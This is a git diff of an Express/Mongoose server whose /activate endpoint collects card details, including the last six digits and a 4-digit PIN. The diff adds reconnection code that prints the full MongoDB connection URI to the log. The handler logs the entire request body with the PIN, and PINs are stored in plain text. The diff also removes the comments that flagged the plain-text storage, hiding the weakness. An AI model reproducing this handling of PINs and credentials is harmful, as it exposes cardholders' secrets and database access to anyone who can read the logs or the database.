@@ -12,23 +12,61 @@ app.use(cors());
 
 const PORT = process.env.PORT || 3001;
 
-// MongoDB Connection with error handling
+// MongoDB Connection with enhanced debugging and corrected timeout
 const mongoUri = process.env.MONGODB_URI;
 if (!mongoUri) {
-  console.error("MONGODB_URI is not defined in .env");
+  console.error(
+    "MONGODB_URI is not defined in .env. Please set it in your .env file."
+  );
   process.exit(1);
 }
 
-mongoose
-  .connect(mongoUri, {
-    useNewUrlParser: true,
-    useUnifiedTopology: true,
-  })
-  .then(() => console.log("Connected to MongoDB"))
-  .catch((err) => {
-    console.error("MongoDB connection error:", err);
-    process.exit(1);
+const connectWithRetry = () => {
+  console.log("Attempting to connect to MongoDB with URI:", mongoUri); // Debug URI
+  mongoose
+    .connect(mongoUri, {
+      serverSelectionTimeoutMS: 30000, // Set to 30 seconds
+      heartbeatFrequencyMS: 10000,
+      retryWrites: true,
+      w: "majority",
+    })
+    .then(() => {
+      console.log("Connected to MongoDB successfully");
+    })
+    .catch((err) => {
+      console.error("MongoDB connection error:", {
+        message: err.message,
+        name: err.name,
+        reason: err.reason,
+        code: err.code,
+        stack: err.stack, // Add stack trace for more details
+      });
+      console.log("Retrying connection in 5 seconds...");
+      setTimeout(connectWithRetry, 5000); // Retry after 5 seconds
+    });
+};
+
+connectWithRetry();
+
+mongoose.connection.on("disconnected", () => {
+  console.log("MongoDB disconnected. Attempting to reconnect...");
+  connectWithRetry();
+});
+
+mongoose.connection.on("error", (err) => {
+  console.error("MongoDB connection error event:", err);
+});
+
+mongoose.connection.on("reconnected", () => {
+  console.log("MongoDB reconnected successfully");
+});
+
+process.on("SIGINT", () => {
+  mongoose.connection.close(() => {
+    console.log("MongoDB connection closed due to app termination");
+    process.exit(0);
   });
+});
 
 const activationSchema = new mongoose.Schema({
   cardType: { type: String, required: true },
@@ -37,7 +75,7 @@ const activationSchema = new mongoose.Schema({
   currency: { type: String, required: true },
   dailyLimit: { type: Number, required: true },
   accept: { type: Boolean, required: true },
-  pin: { type: String, required: true }, // Plain text PIN for now
+  pin: { type: String, required: true },
   createdAt: { type: Date, default: Date.now },
 });
 
@@ -62,11 +100,9 @@ app.post("/validate-digits", async (req, res) => {
     return res.status(200).json({ message: "Digits validated successfully" });
   } catch (error) {
     console.error("Server error in /validate-digits:", error);
-    return res
-      .status(500)
-      .json({
-        message: "An unexpected error occurred. Please try again later.",
-      });
+    return res.status(500).json({
+      message: "An unexpected error occurred. Please try again later.",
+    });
   }
 });
 
@@ -84,7 +120,6 @@ app.post("/activate", async (req, res) => {
   console.log("Activating card with data:", req.body);
 
   try {
-    // Validate required fields
     if (
       !cardType ||
       !lastSixDigits ||
@@ -99,14 +134,12 @@ app.post("/activate", async (req, res) => {
         .json({ message: "All fields are required to activate your card." });
     }
 
-    // Validate last 6 digits
     if (lastSixDigits.length !== 6 || !/^\d+$/.test(lastSixDigits)) {
       return res
         .status(400)
         .json({ message: "The last 6 digits must be exactly 6 numbers." });
     }
 
-    // Validate daily limit
     const limit = parseInt(dailyLimit);
     if (limit > 5000 || limit < 0) {
       return res
@@ -114,7 +147,6 @@ app.post("/activate", async (req, res) => {
         .json({ message: "Daily limit must be between 0 and 5000." });
     }
 
-    // Validate currency
     const validCurrencies = [
       "USD",
       "EUR",
@@ -133,19 +165,16 @@ app.post("/activate", async (req, res) => {
         .json({ message: "Unsupported currency selected." });
     }
 
-    // Validate PIN
     if (pin.length !== 4 || !/^\d+$/.test(pin)) {
       return res.status(400).json({ message: "PIN must be exactly 4 digits." });
     }
 
-    // Check acceptance
     if (!accept) {
       return res
         .status(400)
         .json({ message: "You must accept the terms to proceed." });
     }
 
-    // Save to database
     const newActivation = new Activation({
       cardType,
       lastSixDigits,
@@ -153,20 +182,17 @@ app.post("/activate", async (req, res) => {
       currency,
       dailyLimit: limit,
       accept,
-      pin, // Store PIN in plain text
+      pin,
     });
     await newActivation.save();
     console.log("Activation saved to DB");
 
-    // Return success without sensitive data in response
     return res.status(200).json({ message: "Card activated successfully" });
   } catch (error) {
     console.error("Server error in /activate:", error);
-    return res
-      .status(500)
-      .json({
-        message: "An unexpected error occurred. Please try again later.",
-      });
+    return res.status(500).json({
+      message: "An unexpected error occurred. Please try again later.",
+    });
   }
 });
 
